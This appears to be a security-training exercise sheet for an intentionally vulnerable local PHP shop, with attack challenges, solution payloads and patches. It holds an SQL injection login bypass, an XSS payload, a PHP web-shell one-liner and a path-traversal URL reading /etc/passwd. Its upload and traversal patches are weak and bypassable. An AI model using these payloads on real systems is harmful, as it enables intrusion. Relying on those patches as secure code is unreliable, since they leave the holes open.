summary:  Exercises
id:  exercises
categories: PHP
enviroments: Web
author: Alexander Hayman

# Exercises

## Before you begin

In this code, you will have four challenges to complete relating to the vulnerabilities implemented on the vulnerable Pixelated Shop.

### Prerequisites

- Basic PHP Web Development Knowledge
- Basic SQL Knowledge


## Deploy a Docker Container

1. Install [docker](https://docs.docker.com/get-docker/)
2. Run `git clone https://git.cardiff.ac.uk/c1901577/vulnerable-web-application.git`
3. Go into the cloned folder `cd vulnerable-web-application`
4. Run `docker-compose up`
5. Browse to [http://localhost](http://localhost)

## Challenges

###  SQL Injection Challenge

The login page is vulnerable to an SQL Injection attack. Exploit the vulenrability in order to login as admin without a password.

###  Cross-Site Scripting Challenge

The account section on the website has a stored xss vulnerability. Exploit the vulnerability by creating a payload that creates an alert on the system. To verify this works, login as admin and view the admin panel.

### Relative Path Traversal

The method the website lists items is vulnerable to relative path traversal attack. Exploit this weakness to read /etc/passwd file on the system.

### Unrestricted File Upload

It looks like you can upload any file to the system in the user profile section. Use this weakness to upload a malicous php file in order to execute commands remotely. Verify this script works by executing linux commands.

### Secure the website

Now modify the code to patch all the vulnerabilities on the system. Use the attack method used for the challenges to verify that the vulnerability has been patched


## Attack Methods Solutions

###  SQL Injection Challenge

Use this payload for the login and password field to login as admin

```sql
admin' or ''='
or ''='
```
The query would look like this after the payload

```sql
SELECT username FROM user WHERE username='admin' or ''='' AND password='' or ''='' LIMIT 1
```
The WHERE clause returns true bypassing the requirement for a password.

### Cross-site Scripting  (XSS) Challenge 

Add this payload to the description form 

```html
<script>alert("hello")</script>
```

This payload will generate an alert box saying `"hello"` when the admin visits the admin panel.

### Unrestricted File Upload

Upload a one liner php script that can execute remote commands on the server

```php
<?php system("$_GET['cmd']") ?>
``` 
Access the file in the uploads directory and verify that the script works

```
http://127.0.0.1/uploads/uploadedFileName?cmd=id
```

This would output the id of www-data on the machine.

### Relative Path Traversal

Modify the url when viewing an item

```
http://127.0.0.1/shop.php?item=../../../../../etc/passwd
```

This would display the `/etc/passwd` file.


## Patching Solutions

### SQL Injection

Use a prepared statement to protect against SQL Injections

#### src/login.php

```sql
$checkUser = "SELECT username FROM user WHERE username=? AND password=? LIMIT 1";
$stmt = $db->prepare($checkUser);
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

$user = $result->fetch_assoc();
```

### Cross-site Scripting (XSS)

Use `htmlspecialchars()` function to convert special characters HTML entities so that the contents of the script tag does not get executed.

#### public/admin.php

```php
<?php if($user[1]): ?>
    <td> <?= htmlspecialchars($user[1]); ?></td>
<?php else: ?>
```

###  Unrestricted File Upload

Make a whitelist to only allow images formats to be uploaded.

#### src/updateProfile.php

```php
$fileType= $_FILES['uploadFile']['type'];
$allowedTypes = array("image/jpeg", "image/gif", "image/png");

if(in_array($fileType, $allowedTypes)) {
    //Upload File
}
else {
    //Invalid File Type
}
```

### Relative Path Traversal

Use base directories and compare whether the user's path is inside the allowed directory. If it is outside the directory, deny access.

```php
$baseDir = "items/";
    $realDir = realpath($baseDir);

    $userDir = $baseDir . $_GET["item"];
    $realUserDir = realpath($userDir);

    if($realUserDir === false || strpos($realUserDir, $baseDir) === false) {
        echo("Item does not exist!");
    }
    else {
        include($userDir);
    }
```